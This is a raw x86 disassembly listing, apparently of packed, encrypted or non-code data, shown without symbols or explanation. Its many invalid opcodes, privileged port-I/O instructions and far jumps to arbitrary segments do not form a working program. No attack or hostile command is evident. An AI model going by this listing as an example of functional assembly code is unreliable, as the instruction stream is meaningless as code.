  41f7d4:	shl    DWORD PTR [edx+0x2c],0x9f
  41f7d8:	cmp    DWORD PTR [esi+0x4e],esi
  41f7db:	out    0x13,al
  41f7dd:	pop    ecx
  41f7de:	lahf   
  41f7df:	mov    edi,0xfbdf959b
  41f7e4:	outs   dx,BYTE PTR ds:[esi]
  41f7e5:	call   0x7c79:0xdd637106
  41f7ec:	int3   
  41f7ed:	ret    0x4217
  41f7f0:	cli    
  41f7f1:	xchg   eax,esp
  41f7f3:	sbb    ah,0xd0
  41f7f6:	mov    edx,0x7825267
  41f7fb:	or     ch,ch
  41f7fd:	jnp    0x41f87e
  41f7ff:	clc    
  41f800:	stc    
  41f801:	lds    edx,FWORD PTR [ecx-0x55f6f54e]
  41f807:	xor    BYTE PTR [esi],ch
  41f809:	push   esi
  41f80a:	out    dx,eax
  41f80b:	or     BYTE PTR [edi],dh
  41f80d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f80e:	(bad)  
  41f810:	mov    al,ds:0xf23bc1a7
  41f815:	add    BYTE PTR [ecx],ah
  41f817:	or     al,0xb8
  41f819:	fist   DWORD PTR [esi-0x56172e51]
  41f81f:	jne    0x41f874
  41f821:	gs loop 0x41f7f5
  41f824:	pop    ss
  41f825:	lods   al,BYTE PTR ds:[esi]
  41f826:	dec    edx
  41f827:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f828:	ins    DWORD PTR es:[edi],dx
  41f829:	repnz or al,0xcf
  41f82c:	cld    
  41f82d:	cmp    DWORD PTR [edx-0x22512de2],0x1e
  41f834:	adc    ch,BYTE PTR [esi-0x5a]
  41f837:	sbb    cl,ch
  41f839:	and    eax,edx
  41f83b:	ror    DWORD PTR [ebx],1
  41f83d:	inc    ebp
  41f83e:	jmp    0x2e58:0xb7ad9588
  41f845:	ins    BYTE PTR es:[edi],dx
  41f846:	(bad)  [edi+eiz*4]
  41f849:	fmul   QWORD PTR [ecx-0x61]
  41f84c:	or     al,0x24
  41f84f:	and    eax,0xadc799d8
  41f854:	mov    ah,0xd3
  41f856:	data16 loop 0x41f870
  41f859:	mov    ebp,0x9f692c74
  41f85e:	stos   DWORD PTR es:[edi],eax
  41f85f:	es push ss
  41f861:	or     esp,DWORD PTR [esp+edi*8-0x1fa12d62]
  41f868:	xlat   BYTE PTR ds:[ebx]
  41f869:	inc    ecx
  41f86a:	xchg   edi,eax
  41f86b:	push   ebp
  41f86c:	pop    edx
  41f86d:	mov    cl,dl
  41f86f:	les    edx,FWORD PTR [eax-0x7c1488c2]
  41f875:	scas   eax,DWORD PTR es:[edi]
  41f876:	pop    edx
  41f877:	mov    eax,?
  41f879:	mov    al,ds:0x3a9689da
  41f87e:	sub    al,0x2
  41f880:	jae    0x41f8e2
  41f882:	push   ebx
  41f883:	sub    dh,BYTE PTR [edi]
  41f885:	mov    eax,ds:0xb9f54031
  41f88a:	mov    bl,0x11
  41f88c:	shr    edi,0xd5
  41f88f:	xchg   edx,eax
  41f890:	sub    al,0xf3
  41f892:	leave  
  41f893:	pop    edx
  41f894:	cld    
  41f895:	int3   
  41f896:	mov    ecx,0xdfcdf8e0
  41f89b:	pop    ecx
  41f89c:	out    0x14,eax
  41f89e:	fnstcw WORD PTR [ebp+0x5b]
  41f8a1:	inc    ebp
  41f8a2:	retf   0xa71b
  41f8a5:	into   
  41f8a6:	xchg   DWORD PTR [edi+esi*4-0x7],edi
  41f8aa:	daa    
  41f8ab:	xchg   esp,eax
  41f8ac:	call   0xf6a2:0x48d2f8e1
  41f8b3:	mov    WORD PTR [edx-0x4ecf14ec],fs
  41f8b9:	mov    bh,0xee
  41f8bb:	add    al,0x9e
  41f8bd:	xor    BYTE PTR [ebx-0x2e],ch
  41f8c0:	or     BYTE PTR [esi-0x3b],bh
  41f8c3:	daa    
  41f8c4:	js     0x41f900
  41f8c6:	adc    DWORD PTR [edx-0x390bfab6],eax
  41f8cc:	call   0x2b2e:0xdc0ed368
  41f8d3:	pop    edx
  41f8d4:	scas   eax,DWORD PTR es:[edi]
  41f8d5:	cmp    dh,BYTE PTR [ecx+0x657d11ec]
  41f8db:	push   esi
  41f8dc:	fstp   TBYTE PTR [eax+0x74]
  41f8df:	les    esi,FWORD PTR [edx+0x2d]
  41f8e2:	imul   ecx,DWORD PTR [ebp+eiz*2-0x23b5197c],0xa0b972d7
  41f8ed:	and    ah,BYTE PTR [esi-0x7b]
  41f8f0:	sbb    ebp,edi
  41f8f2:	push   ebp
  41f8f3:	sub    bl,BYTE PTR [edx]
  41f8f5:	xor    al,0xa2
  41f8f7:	aaa    
  41f8f8:	retf   
  41f8f9:	call   0x4f96:0x30ade535
  41f900:	cmp    BYTE PTR [ebx],ah
  41f902:	push   edx
  41f903:	pop    ecx
  41f904:	(bad)  
  41f905:	lods   al,BYTE PTR ds:[esi]
  41f906:	popa   
  41f907:	in     al,dx
  41f908:	jne    0x41f955
  41f90a:	mov    WORD PTR [edi+ebp*8+0x67],fs
  41f90e:	sbb    edx,DWORD PTR [ecx]
  41f910:	mov    al,0x66
  41f912:	push   ebp
  41f913:	out    dx,eax
  41f914:	jmp    FWORD PTR [edi]
  41f916:	cmp    bl,BYTE PTR cs:[eax+0x44c48e38]
  41f91d:	ss pop esi
  41f91f:	(bad)  
  41f920:	jo     0x41f8d6
  41f922:	test   BYTE PTR [eax],0x5d
  41f925:	rcr    ch,1
  41f927:	sahf   
  41f928:	mov    eax,0x24cbec69
  41f92d:	sub    DWORD PTR cs:[edi+0x712bdeb3],esp
  41f934:	(bad)  
  41f935:	out    dx,eax
  41f936:	cmp    DWORD PTR [edi-0x63],edx
  41f939:	xlat   BYTE PTR ds:[ebx]
  41f93a:	ins    DWORD PTR es:[edi],dx
  41f93b:	imul   edi,edi,0x7ed31eb9
  41f941:	push   ebx
  41f942:	mov    ecx,0x7db04d3a
  41f947:	jbe    0x41f99c
  41f949:	inc    esp
  41f94a:	jmp    0x2fb6:0x92b04d1f
  41f951:	jge    0x41f9a8
  41f953:	mov    ebx,0x887997ee
  41f958:	inc    esi
  41f959:	add    DWORD PTR [esp+edi*2-0x12],eax
  41f95d:	inc    edi
  41f95e:	push   es
  41f95f:	sar    DWORD PTR [ecx+0x1bf34fed],cl
  41f965:	lahf   
  41f966:	mov    al,0x4
  41f968:	xlat   BYTE PTR ds:[ebx]
  41f969:	adc    BYTE PTR [ecx+0x49],bh
  41f96c:	pop    ebx
  41f96d:	hlt    
  41f96e:	pop    eax
  41f96f:	xchg   ecx,eax
  41f970:	and    dh,BYTE PTR [edx]
  41f972:	mov    cl,0xc2
  41f974:	ret    0x8576
  41f977:	imul   BYTE PTR [ebx+0x1a8bd135]
  41f97d:	add    al,0xdf
  41f97f:	std    
  41f980:	push   0x5651126e
  41f985:	mov    WORD PTR [eax-0x31af5d6a],ss
  41f98b:	pushf  
  41f98c:	sbb    eax,0x104a8f7e
  41f991:	icebp  
  41f992:	jecxz  0x41f95f
  41f994:	test   BYTE PTR [ebx],0x3e
  41f997:	mov    ebp,0xdd6060b4
  41f99c:	sub    dh,BYTE PTR [esi]
  41f99e:	fnstsw WORD PTR [eax+0x7df3a1d7]
  41f9a4:	mov    esi,0x1af2550d
  41f9a9:	fnstenv [ebx]
  41f9ab:	popa   
  41f9ac:	cli    
  41f9ad:	push   edi
  41f9ae:	fwait
  41f9af:	or     eax,DWORD PTR [esi+0x21]
  41f9b2:	push   esp
  41f9b3:	retf   0x9877
  41f9b6:	fwait
  41f9b7:	sub    dh,BYTE PTR [ebp-0x7f]
  41f9ba:	cwde   
  41f9bb:	xchg   esi,eax
  41f9bc:	cld    
  41f9bd:	or     BYTE PTR [ebx-0x30900b7a],al
  41f9c3:	test   BYTE PTR [ebp+eax*1+0x7059000a],bl
  41f9ca:	push   ss
  41f9cb:	addr16 nop
  41f9cd:	lods   eax,DWORD PTR ds:[esi]
  41f9ce:	sahf   
  41f9cf:	ror    BYTE PTR [esi+0x57],0xaf
  41f9d3:	fisttp QWORD PTR [eax-0x4]
  41f9d6:	jo     0x41f9c9
  41f9d8:	mov    ah,al
  41f9da:	push   ecx
  41f9db:	mov    ds:0x207a60b,eax
  41f9e0:	xchg   ecx,eax
  41f9e1:	jg     0x41f9e9
  41f9e3:	sub    eax,DWORD PTR [eax]
	...
  41f9f1:	mov    edi,0x9c801c2f
  41f9f6:	mov    bl,0xbf
  41f9f8:	aas    
  41f9f9:	sysexit 
  41f9fb:	pop    ecx
  41f9fc:	push   ss
  41f9fd:	xchg   edi,eax
  41f9fe:	mov    bl,0xf7
  41fa00:	dec    edi
  41fa01:	ins    DWORD PTR es:[edi],dx
  41fa02:	je     0x41fa05
  41fa04:	add    BYTE PTR [ebx-0x6efffffd],ch
  41fa0a:	sub    BYTE PTR [eax+edx*1],al
  41fa0d:	cwde   
  41fa0e:	pop    es
  41fa0f:	int    0xbe
  41fa11:	ret    
  41fa12:	sbb    esp,ebx
  41fa14:	jmp    0xc10e1033
  41fa19:	test   BYTE PTR [edi+0x75109f9c],cl
  41fa1f:	jnp    0x41fa77
  41fa21:	rol    esi,1
  41fa23:	inc    eax
  41fa24:	fnstsw WORD PTR [ecx-0x4cc3c1a3]
  41fa2a:	jge    0x41f9b1
  41fa2c:	cdq    
  41fa2d:	fidivr WORD PTR [ecx+0x25]
  41fa30:	or     cl,al
  41fa32:	pop    es
  41fa33:	(bad)  
  41fa34:	jo     0x41fa25
  41fa36:	or     al,0xb3
  41fa38:	cdq    
  41fa39:	int3   
  41fa3a:	test   DWORD PTR [ebx+0x440e6a5e],edx
  41fa40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa41:	mov    al,ds:0xe495bdf6
  41fa46:	clc    
  41fa47:	(bad)  
  41fa48:	jmp    0x41dee78b
  41fa4d:	gs dec eax
  41fa4f:	add    BYTE PTR [edx-0x10aaf03a],bh
  41fa55:	scas   eax,DWORD PTR es:[edi]
  41fa56:	jno    0x41fa98
  41fa58:	adc    eax,0x1978bfa7
  41fa5d:	lds    edi,FWORD PTR [ebx-0x3b2c043d]
  41fa63:	xchg   edx,eax
  41fa64:	aas    
  41fa65:	rcl    BYTE PTR [edi-0x33],0x28
  41fa69:	sub    esi,esi
  41fa6b:	(bad)  
  41fa6c:	sbb    BYTE PTR [ebp-0x12e46c4],bh
  41fa72:	in     eax,0x34
  41fa74:	xchg   dx,ax
  41fa76:	push   esi
  41fa77:	adc    al,0x39
  41fa79:	push   ebp
  41fa7a:	mov    eax,ds:0x18aa51bb
  41fa7f:	xor    DWORD PTR [esi+0x19c7c41d],ebp
  41fa85:	inc    esp
  41fa86:	repz ret 
  41fa88:	cmp    al,0x78
  41fa8a:	sub    eax,0x3bb9d669
  41fa8f:	in     al,0x22
  41fa91:	pop    edi
  41fa92:	lea    ebp,[edi-0x792de716]
  41fa98:	call   0xfaae381
  41fa9d:	mov    dx,0x107a
  41faa1:	ss ins DWORD PTR es:[edi],dx
  41faa3:	pop    ds
  41faa4:	dec    edi
  41faa5:	icebp  
  41faa6:	jge    0x41fa8e
  41faa8:	ret    0xff1c
  41faab:	rcr    eax,0x74
  41faae:	inc    eax
  41faaf:	stos   DWORD PTR es:[edi],eax
  41fab0:	sub    ebp,edx
  41fab2:	shl    BYTE PTR [ebp+0x25f90297],0x1e
  41fab9:	adc    eax,DWORD PTR [ebp-0x7f]
  41fabc:	in     eax,0xfc
  41fabe:	sbb    eax,0x975b7c25
  41fac3:	xor    DWORD PTR [eax+0x5c5f8ac8],edi
  41fac9:	inc    esi
  41faca:	push   esi
  41facb:	daa    
  41facc:	push   es
  41facd:	jp     0x41fa8b
  41facf:	popa   
  41fad0:	(bad)  
  41fad2:	bound  esp,QWORD PTR [edi]
  41fad4:	outs   dx,BYTE PTR ds:[esi]
  41fad5:	mov    eax,0x597a7299
  41fada:	mov    dh,0x8c
  41fadc:	xor    BYTE PTR [eax-0x7a],ah
  41fadf:	xchg   esi,eax
  41fae0:	dec    ecx
  41fae1:	and    dl,BYTE PTR [ecx+ebp*2+0x38]
  41fae5:	pop    ebp
  41fae6:	iret   
  41fae7:	mov    al,BYTE PTR [esi-0x33]
  41faea:	adc    al,0x40
  41faec:	(bad)
  41faf1:	inc    eax
  41faf2:	fisttp DWORD PTR [eax-0x72]
  41faf5:	pop    ebx
  41faf6:	push   cs
  41faf7:	mov    al,0xad
  41faf9:	xchg   ebx,eax
  41fafa:	(bad)  
  41fafb:	jb     0x41fadc
  41fafd:	or     BYTE PTR [edx+0x32],bl
  41fb00:	je     0x41fa87
  41fb02:	ret    
  41fb03:	adc    eax,0x11cb32a4
  41fb08:	ret    
  41fb09:	call   0x4637e73b
  41fb0e:	(bad)  
  41fb0f:	into   
  41fb10:	imul   ebp,edx,0xa0178ed1
  41fb16:	je     0x41faff
  41fb18:	add    DWORD PTR [eax-0x48],edx
  41fb1b:	aas    
  41fb1c:	adc    DWORD PTR [eax-0xf],edi
  41fb1f:	mov    ds:0x848b2427,al
  41fb24:	xor    al,0x71
  41fb26:	or     bl,bl
  41fb28:	adc    ecx,edi
  41fb2a:	and    eax,0x6ef81fe2
  41fb2f:	xor    cl,BYTE PTR [eax+0x8750928]
  41fb35:	pusha  
  41fb36:	into   
  41fb37:	or     edi,edi
  41fb39:	aaa    
  41fb3a:	or     dh,BYTE PTR [ebp+0x2a]
  41fb3d:	popa   
  41fb3e:	leave  
  41fb3f:	jmp    0x41fb0e
  41fb41:	xor    eax,0xedf1aa47
  41fb46:	add    edx,DWORD PTR [edi-0x1183b0d8]
  41fb4c:	sub    eax,0xbe2cd913
  41fb51:	mov    esp,0x650854d0
  41fb56:	pop    ebp
  41fb57:	(bad)  
  41fb58:	mov    edi,0x7bc72f06
  41fb5d:	stc    
  41fb5e:	fs push edi
  41fb60:	mov    esp,0x7232f1d6
  41fb65:	sub    ecx,DWORD PTR [ebp-0x2256d5f1]
  41fb6b:	pushf  
  41fb6c:	xchg   edi,eax
  41fb6d:	inc    esi
  41fb6e:	shl    al,cl
  41fb70:	mov    WORD PTR [ecx-0x7b13db58],gs
  41fb76:	sbb    ebp,DWORD PTR [edi+0x6a]
  41fb79:	shr    ch,0x45
  41fb7c:	pop    edx
  41fb7d:	xor    DWORD PTR [ecx-0x49],esp
  41fb80:	ins    DWORD PTR es:[edi],dx
  41fb81:	xor    eax,0xae10ced1
  41fb86:	mov    BYTE PTR ss:[ebp+0x5b],bl
  41fb8a:	out    dx,eax
  41fb8b:	pcmpgtb mm3,QWORD PTR [ebx+ebx*2+0x40da2347]
  41fb93:	stc    
  41fb94:	(bad)  
  41fb96:	inc    eax
  41fb97:	inc    ebx
  41fb98:	mov    esi,0xfd00f2f5
  41fb9d:	rcr    DWORD PTR [ecx-0x7c],0xbd
  41fba1:	dec    esp
  41fba2:	lds    esi,FWORD PTR [esi]
  41fba4:	add    esi,DWORD PTR [ebx]
  41fba6:	outs   dx,BYTE PTR ds:[esi]
  41fba7:	and    esp,DWORD PTR [eax]
  41fba9:	sub    eax,0xcfdf25c0
  41fbae:	xchg   ecx,eax
  41fbaf:	sub    al,0x36
  41fbb1:	cmp    eax,0xdcbc3024
  41fbb6:	pop    edx
  41fbb7:	add    ebx,DWORD PTR [ebx]
  41fbb9:	lea    esi,[ecx]
  41fbbb:	jns    0x41fbcf
  41fbbd:	push   ebp
  41fbbe:	iret   
  41fbbf:	push   eax
  41fbc0:	cmc    
  41fbc1:	mov    ds:0x156c0a21,eax
  41fbc6:	int3   
  41fbc7:	ret    
  41fbc8:	(bad)  
  41fbc9:	lods   al,BYTE PTR ds:[esi]
  41fbca:	mov    esp,0x86a5e278
  41fbcf:	push   eax
  41fbd0:	inc    ebp
  41fbd1:	jae    0x41fbb6
  41fbd3:	xchg   ebp,eax
  41fbd4:	rcr    cl,0xe
  41fbd7:	lock jecxz 0x41fbb4
  41fbda:	lods   al,BYTE PTR ds:[esi]
  41fbdb:	and    dl,dh
  41fbdd:	dec    esp
  41fbde:	int    0xea
  41fbe0:	enter  0x8de4,0xec
  41fbe4:	mov    dl,0x80
  41fbe6:	push   ecx
  41fbe7:	jmp    0x41fb70
  41fbe9:	pop    ebp
  41fbea:	dec    esp
  41fbeb:	dec    esi
  41fbec:	loopne 0x41fc2b
  41fbee:	pmaddwd mm6,QWORD PTR [edx-0x6e]
  41fbf2:	push   0x614fbcb8
  41fbf7:	fs das 
  41fbf9:	ss push 0xfffffff8
  41fbfc:	ins    DWORD PTR es:[edi],dx
  41fbfd:	lahf   
  41fbfe:	(bad)  
  41fbff:	xor    DWORD PTR [ecx-0x793e33c5],ebx
  41fc05:	test   eax,0x8451cf9e
  41fc0a:	std    
  41fc0b:	clc    
  41fc0c:	scas   eax,DWORD PTR es:[edi]
  41fc0d:	nop
  41fc0e:	xor    eax,0x59b0aeb5
  41fc13:	inc    ebx
  41fc14:	test   eax,0xa8f7e73d
  41fc19:	lock mov al,ds:0xc028ab41
  41fc1f:	mov    ?,WORD PTR [eax]
  41fc21:	fs dec eax
  41fc23:	dec    esi
  41fc24:	inc    edi
  41fc25:	les    ecx,FWORD PTR [ebx]
  41fc27:	cmp    eax,0xcb37d5d3
  41fc2c:	cmp    ebp,edi
  41fc2e:	push   0x1c
  41fc30:	(bad)  [ebp-0x14]
  41fc33:	inc    ecx
  41fc34:	pop    ecx
  41fc35:	xor    BYTE PTR [edx-0x7ae9a3f7],dl
  41fc3b:	mov    ebx,0x746358ef
  41fc40:	add    esp,ecx
  41fc42:	mov    ebx,0xecc92634
  41fc47:	pop    esp
  41fc48:	jmp    0x41fcb7
  41fc4a:	cmc    
  41fc4b:	dec    ebp
  41fc4c:	xchg   edi,eax
  41fc4d:	repz adc DWORD PTR [ebx-0x5d],esp
  41fc51:	ja     0x41fc1a
  41fc53:	jmp    0xc74:0xff45c28a
  41fc5a:	mov    ebp,0x65f5aad0
  41fc5f:	jp     0x41fca8
  41fc61:	mov    ds:0x245f9fee,al
  41fc66:	loop   0x41fc3b
  41fc68:	add    al,0xfd
  41fc6a:	adc    al,0xac
  41fc6c:	push   sp
  41fc6e:	retf   0xc253
  41fc71:	js     0x41fc36
  41fc73:	adc    cl,BYTE PTR [ebx-0xfa6aa8c]
  41fc79:	xchg   BYTE PTR [esi-0x2099fdba],ch
  41fc7f:	aas    
  41fc80:	(bad)  
  41fc81:	out    dx,eax
  41fc82:	out    dx,al
  41fc83:	cdq    
  41fc84:	pop    ds
  41fc85:	divps  xmm1,XMMWORD PTR [esi]
  41fc88:	mov    ch,0x9c
  41fc8a:	dec    ecx
  41fc8b:	pop    ebx
  41fc8c:	shl    BYTE PTR [edi-0x7b8ddb7],cl
  41fc92:	cwde   
  41fc93:	adc    DWORD PTR [ebx],esp
  41fc95:	call   0xfe0a9cfe
  41fc9a:	ins    BYTE PTR es:[edi],dx
  41fc9b:	ins    BYTE PTR es:[edi],dx
  41fc9c:	cmp    al,0x9
  41fc9e:	aas    
  41fc9f:	jmp    0x41fc3e
  41fca1:	in     al,0xc
  41fca3:	sbb    bl,BYTE PTR [ecx-0x26]
  41fca6:	cmc    
  41fca7:	inc    eax
  41fca8:	jg     0x41fc6b
  41fcaa:	stos   DWORD PTR es:[edi],eax
  41fcab:	repz push eax
  41fcad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fcae:	cdq    
  41fcaf:	(bad)  
  41fcb0:	xor    edx,DWORD PTR [eax+0x76]
  41fcb3:	dec    esi
  41fcb4:	pop    ds
  41fcb5:	nop
  41fcb6:	jl     0x41fcfe
  41fcb8:	jle    0x41fd03
  41fcba:	pop    ds
  41fcbb:	adc    eax,0x962099de
  41fcc0:	adc    eax,0x2e367309
  41fcc5:	sahf   
  41fcc6:	sbb    ch,BYTE PTR [edx+0x32]
  41fcc9:	and    al,0x36
  41fccb:	xchg   ebx,eax
  41fccc:	cmc    
  41fccd:	fadd   st,st(0)
  41fccf:	aad    0x6a
  41fcd1:	lds    ebp,FWORD PTR [edx-0x60]
  41fcd4:	lea    esp,[ebx]
  41fcd6:	addr16 mov eax,fs:0x9ea6
  41fcdb:	push   edx
  41fcdc:	push   edi
  41fcde:	pop    ebx
  41fcdf:	mov    dl,0x52
  41fce1:	(bad)  
  41fce2:	sahf   
  41fce3:	jg     0x41fc88
  41fce5:	add    ah,ch
  41fce7:	mov    ecx,0x275ec632
  41fcec:	push   0xffffff8f
  41fcee:	stos   DWORD PTR es:[edi],eax
  41fcef:	jns    0x41fc9f
  41fcf1:	ret    0xf81e
  41fcf4:	sbb    DWORD PTR [edx+0x7e98f009],esi
  41fcfa:	push   eax
  41fcfb:	daa    
  41fcfc:	int    0x90
  41fcfe:	add    DWORD PTR [esi-0x1a687d1e],0xffffffa2
  41fd05:	(bad)  
  41fd06:	dec    esp
  41fd07:	xor    ecx,esp
  41fd09:	sbb    ah,BYTE PTR [esi+esi*8-0x3209cfb7]
  41fd10:	push   eax
  41fd11:	xchg   edi,eax
  41fd12:	xor    eax,0x6c73f7ee
  41fd17:	data16 arpl WORD PTR [ecx-0x40],ax
  41fd1b:	repz dec eax
  41fd1d:	rcl    BYTE PTR [ebx+ecx*4-0x3cf3974c],1
  41fd24:	faddp  st(6),st
  41fd26:	stos   DWORD PTR es:[edi],eax
  41fd27:	push   0x3c88506b
  41fd2c:	mov    ah,0xb7
  41fd2e:	test   al,0xfc
  41fd30:	lgs    ebx,FWORD PTR [eax+0x688983a4]
  41fd37:	daa    
  41fd38:	ror    BYTE PTR [eax+0x25],cl
  41fd3b:	inc    ebp
  41fd3c:	loope  0x41fcc1
  41fd3e:	test   BYTE PTR [ecx],0x46
  41fd41:	ror    edi,1
  41fd43:	enter  0x7dc1,0xd8
  41fd47:	adc    esi,DWORD PTR [esi]
  41fd49:	repnz cmc 
  41fd4b:	xor    al,0x66
  41fd4d:	mov    edx,0x2d1330b6
  41fd52:	(bad)  
  41fd53:	adc    bh,BYTE PTR [ebx-0x61eae4f2]
  41fd59:	rcl    BYTE PTR [esi-0x50],cl
  41fd5c:	sub    BYTE PTR [ebx],cl
  41fd5e:	ret    0x3f57
  41fd61:	mov    eax,DWORD PTR [eax-0x2026be65]
  41fd67:	mov    ?,edi
  41fd69:	ss aas 
  41fd6b:	mov    WORD PTR [ecx],ss
  41fd6d:	push   es
  41fd6e:	cmp    dl,BYTE PTR [edx+0xff011]
  41fd74:	xor    bl,BYTE PTR [eax-0xdc6199f]
  41fd7a:	data16 jmp 0x41fd87
  41fd7d:	in     al,dx
  41fd7e:	push   esp
  41fd7f:	adc    eax,0x985aea8f
  41fd84:	mov    ds:0x1ecc5a58,eax
  41fd89:	cdq    
  41fd8a:	cmp    BYTE PTR [eax],dl
  41fd8c:	fstp   QWORD PTR [esi-0x56]
  41fd8f:	cmp    BYTE PTR [ebp-0x38],dl
  41fd92:	enter  0x210a,0xa
  41fd96:	push   0xe73c1830
  41fd9b:	enter  0xfb8f,0x54
  41fd9f:	ins    DWORD PTR es:[edi],dx
  41fda0:	jle    0x41fd98
  41fda2:	sub    BYTE PTR [eax+0x29],dh
  41fda5:	pop    edx
  41fda6:	jp     0x41fe22
  41fda8:	push   ebx
  41fda9:	xchg   ecx,eax
  41fdaa:	dec    ebp
  41fdab:	jo     0x41fdc3
  41fdad:	frstor [ebx-0x52]
  41fdb0:	adc    DWORD PTR [ebx+0x400a],0x0
  41fdba:	add    BYTE PTR [eax],al
  41fdbc:	add    BYTE PTR [eax],al
  41fdbe:	add    BYTE PTR [eax],al
  41fdc0:	add    BYTE PTR [ecx-0x400c494c],cl
  41fdc6:	repz int 0xfe
  41fdc9:	push   ebp
  41fdca:	cmp    BYTE PTR [edx-0x7a],bl
  41fdcd:	loop   0x41fdb3
  41fdcf:	sbb    al,0xea
  41fdd1:	sbb    BYTE PTR [eax+0x1],bh
  41fdd4:	add    BYTE PTR [ebx+0x14000003],ch
  41fdda:	repnz std 
  41fddc:	rcl    DWORD PTR [eax+0x3481b762],cl
  41fde2:	cmp    al,0x35
  41fde4:	shl    BYTE PTR [ebx+0x52],cl
  41fde7:	mov    WORD PTR [edx-0x71],?
  41fdea:	mov    bl,0x87
  41fdec:	dec    ebp
  41fded:	xchg   esp,eax
  41fdee:	push   esp
  41fdef:	int    0xc1
  41fdf1:	and    edi,0xffffffce
  41fdf4:	xchg   ebx,eax
  41fdf5:	adc    BYTE PTR [edi],0xe6
  41fdf8:	inc    eax
  41fdf9:	sar    DWORD PTR [edx],1
  41fdfb:	sbb    bh,ah
  41fdfd:	mov    bh,BYTE PTR [edx+0x3f28b01d]
  41fe03:	(bad)  
  41fe04:	icebp  
  41fe05:	ret    0xda61
  41fe08:	fld    TBYTE PTR [esi+0x3e3bc3c1]
  41fe0e:	(bad)  
  41fe10:	ins    BYTE PTR es:[edi],dx
  41fe11:	mov    ds:0xd5edab5b,eax
  41fe16:	dec    esp
  41fe17:	push   cs
  41fe18:	stos   BYTE PTR es:[edi],al
  41fe19:	outs   dx,DWORD PTR ds:[esi]
  41fe1a:	add    bl,bl
  41fe1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe1d:	not    BYTE PTR [ebp+0x5e]
  41fe20:	rcl    DWORD PTR [eax-0x491bed88],cl
  41fe26:	data16 mov al,ds:0xe4e6b805
  41fe2c:	jbe    0x41fe67
  41fe2e:	xlat   BYTE PTR ds:[ebx]
  41fe2f:	lods   al,BYTE PTR ds:[esi]
  41fe30:	ins    BYTE PTR es:[edi],dx
  41fe31:	mov    ebp,0xa604272a
  41fe36:	sub    edx,ebx
  41fe38:	jmp    0x41fded
  41fe3a:	lock add BYTE PTR [ebp+0x6456b07e],bh
  41fe41:	fild   WORD PTR [edx+0x7d]
  41fe44:	daa    
  41fe45:	not    ch
  41fe47:	adc    DWORD PTR [eax+edx*4+0x1e05d9b6],esi
  41fe4e:	inc    eax
  41fe4f:	lds    eax,FWORD PTR [edi]
  41fe51:	push   cs
  41fe52:	xlat   BYTE PTR ds:[ebx]
  41fe53:	sub    DWORD PTR [esi],edx
  41fe55:	xchg   ebp,eax
  41fe56:	lock xchg edi,eax
  41fe58:	shr    BYTE PTR [edi],cl
  41fe5a:	aad    0xe9
  41fe5c:	mov    ebx,0x65207ea6
  41fe61:	sti    
  41fe62:	inc    ecx
  41fe63:	out    dx,eax
  41fe64:	dec    edi
  41fe65:	clc    
  41fe66:	push   edx
  41fe67:	adc    BYTE PTR [edi],ch
  41fe69:	(bad)  
  41fe6a:	(bad)  
  41fe6b:	arpl   WORD PTR [ecx],cx
  41fe6d:	sbb    bh,BYTE PTR [edx]
  41fe6f:	ds inc eax
  41fe71:	sub    edi,DWORD PTR [edx+ebp*1]
  41fe74:	jnp    0x41fe1b
  41fe76:	cdq    
  41fe77:	mov    ebp,0x4038848c
  41fe7c:	and    al,0x14
  41fe7e:	cmp    al,0x7b
  41fe80:	fimul  WORD PTR [edi+0x3f]
  41fe83:	add    edx,ebx
  41fe85:	xchg   edi,eax
  41fe86:	or     DWORD PTR [esi],ecx
  41fe88:	and    al,0xca
  41fe8a:	xchg   esi,eax
  41fe8b:	outs   dx,DWORD PTR ds:[esi]
  41fe8c:	cmp    esi,ecx
  41fe8e:	(bad)  
  41fe8f:	enter  0xd060,0x0
  41fe93:	xchg   DWORD PTR [ecx-0x211dc036],edx
  41fe99:	push   ss
  41fe9a:	loop   0x41fedf
  41fe9c:	mov    esp,0x57892dfd
  41fea1:	mov    esp,0x992892b2
  41fea6:	inc    ecx
  41fea7:	xchg   esi,eax
  41fea8:	shl    BYTE PTR [ebx+0x18],0xbf
  41feac:	shl    DWORD PTR [edi+0xd0ddebc],cl
  41feb2:	es and al,0xeb
  41feb5:	popa   
  41feb6:	fiadd  DWORD PTR [ebx-0x17]
  41feb9:	mov    ebx,ecx
  41febb:	add    al,0xe7
  41febd:	cmp    eax,0x6e6c30e5
  41fec2:	inc    esi
  41fec3:	daa    
  41fec4:	jp     0x41fec6
  41fec6:	mov    ds:0x1a6862f1,eax
  41fecb:	mov    ebx,DWORD PTR [ebp+0x5b]
  41fece:	loop   0x41ff38
  41fed0:	loop   0x41ff19
  41fed2:	test   al,0x4b
  41fed4:	leave  
  41fed5:	(bad)  
  41fed6:	lods   al,BYTE PTR ds:[esi]
  41fed7:	rcr    DWORD PTR [eax],0x1c
  41feda:	xchg   edi,eax
  41fedb:	(bad)  
  41fedc:	jg     0x41ff4e
  41fede:	mov    esp,0xb4a4a739
  41fee3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fee4:	push   ds
  41fee5:	int    0xd0
  41fee7:	jl     0x41ff08
  41fee9:	adc    DWORD PTR [ecx],esp
  41feeb:	jno    0x41ff31
  41feed:	jecxz  0x41fe70
  41feef:	push   esi
  41fef0:	push   ebp
  41fef1:	aad    0x38
  41fef3:	adc    BYTE PTR [edi+0x512fd7a3],0xa2
  41fefa:	add    eax,0x8997b148
  41feff:	or     dh,0x6a
  41ff02:	jnp    0x41ff0a
  41ff04:	push   0x8da2b23e
  41ff09:	lock jp 0x41fef6
  41ff0c:	cs jno 0x41fec1
  41ff0f:	in     eax,0xa0
  41ff11:	das    
  41ff12:	(bad)  
  41ff13:	(bad)  
  41ff14:	sahf   
  41ff15:	es mov esp,0xea02b405
  41ff1b:	scas   eax,DWORD PTR es:[edi]
  41ff1c:	iret   
  41ff1d:	in     al,0x58
  41ff1f:	rol    DWORD PTR cs:[ecx+edi*8],cl
  41ff23:	ja     0x41ffa3
  41ff25:	inc    esi
  41ff26:	test   al,0x3
  41ff28:	cmc    
  41ff29:	fisttp WORD PTR [esi-0x54]
  41ff2c:	and    BYTE PTR [ecx],ah
  41ff2e:	pop    sp
  41ff30:	fiadd  DWORD PTR [edi+0x614621be]
  41ff36:	and    bl,bl
  41ff38:	dec    edi
